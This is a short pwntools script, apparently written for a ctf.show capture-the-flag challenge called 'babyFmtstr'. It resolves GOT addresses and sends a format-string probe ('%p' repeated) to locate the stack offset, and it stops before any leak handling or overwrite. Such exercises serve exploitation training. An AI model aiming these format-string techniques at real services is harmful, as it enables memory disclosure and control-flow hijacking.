from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'
import sys
# context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./babyFmtstr')
    elf = ELF('./babyFmtstr')
else:
    p = remote('pwn.challenge.ctf.show', 28104)
    elf = ELF('./babyFmtstr')
    pause()
main_addr=0x0000000000400E93
memset_got=elf.got['memset']
strdup_got=elf.got['strdup']
puts_got=elf.got['puts']
print(hex(memset_got))
pause()
# 第八个开始
payload_1 = b'aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p'
p.sendlineafter(b"please input name:\n",payload_1)
p.recv()
p.interactive()